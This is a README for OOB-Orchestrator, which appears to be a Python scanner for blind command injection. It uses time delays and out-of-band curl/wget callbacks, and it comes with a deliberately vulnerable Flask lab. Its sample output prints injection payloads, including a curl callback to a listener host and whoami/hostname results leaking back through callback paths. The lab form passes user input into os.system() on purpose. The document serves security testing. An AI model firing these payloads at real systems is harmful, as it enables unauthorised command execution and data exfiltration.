# OOB-Orchestrator: Autonomous OOB Command Injection Scanner

A Python-based security tool that detects **Blind Command Injection** vulnerabilities using Out-of-Band (OOB) callbacks and time-based analysis.

---

## Architecture

```
main.py  (orchestrator)
│
├── core/listener.py   Phase 1 — HTTP server that catches OOB callbacks
├── core/scraper.py    Phase 2 — BeautifulSoup form/input discovery
└── core/engine.py     Phase 3 — Tagged payload generation
```

The listener and orchestrator share a `queue.Queue`. When a target server makes a callback, the listener puts the path into the queue and the orchestrator reads it — confirming an OOB hit in real time.

No third-party callback services required — everything runs on your own machine.

---

## Detection Methods

| Method | How it works |
|---|---|
| **Time-based** | Injects `sleep`/`ping` commands; measures response delay vs. a baseline request to avoid false positives |
| **OOB callback** | Forces the target to `curl`/`wget` back to the local listener |
| **Data exfiltration** | Extracts `whoami` and `hostname` via the callback URL path |

---

## Setup

```bash
pip install -r requirements.txt
```

---

## Usage

**Terminal 1 — start the vulnerable lab:**
```bash
python3 vulnerable_app.py
```

**Terminal 2 — run the scanner:**
```bash
python3 main.py
```

You will only be prompted for one thing:
```
[?] Enter Target URL (e.g. http://127.0.0.1:9000):
```

LHOST is auto-detected from your machine and LPORT defaults to `8000` — no manual input needed.

---

## Sample Output

```
[*] Listener will bind on 192.168.1.14:8000
[*] Measuring baseline response time...
[*] Baseline: 0.03s

[*] Auditing field: 'userid' at http://127.0.0.1:9000/submit-data

  [>] Firing (time_based): ; sleep 10 #
  [!!!] VULNERABILITY CONFIRMED: TIME-BASED INJECTION [!!!]
  [+] Field 'userid' responded in 10.21s (baseline: 0.03s)

  [>] Firing (oob): ; curl http://192.168.1.14:8000/HTTP_HIT #
  [!!!] VULNERABILITY CONFIRMED: OOB CALLBACK RECEIVED [!!!]
  [+] Callback path: /HTTP_HIT

  [+] Callback path: /cmd/root        ← whoami result
  [+] Callback path: /cmd/kali        ← hostname result

[*] Report saved to report.json
[*] Orchestration complete.
```

A `report.json` file is written after each run with all confirmed findings.

---

## Vulnerable Lab

`vulnerable_app.py` is a self-contained Flask lab with two forms:

| Form | Type | Description |
|---|---|---|
| User ID Lookup | **Vulnerable** | Input passed directly into `os.system()` — injectable |
| Hostname Lookup | **Safe** | Input validated with regex — not injectable |

The safe form lets you verify the scanner correctly identifies non-vulnerable fields.

---

## Project Structure

```
oob-scanner/
├── main.py              Orchestrator entry point
├── vulnerable_app.py    Self-contained lab target (Flask)
├── requirements.txt
├── .gitignore
└── core/
    ├── __init__.py
    ├── listener.py      OOB HTTP listener
    ├── scraper.py       Form/input discovery
    └── engine.py        Payload engine
```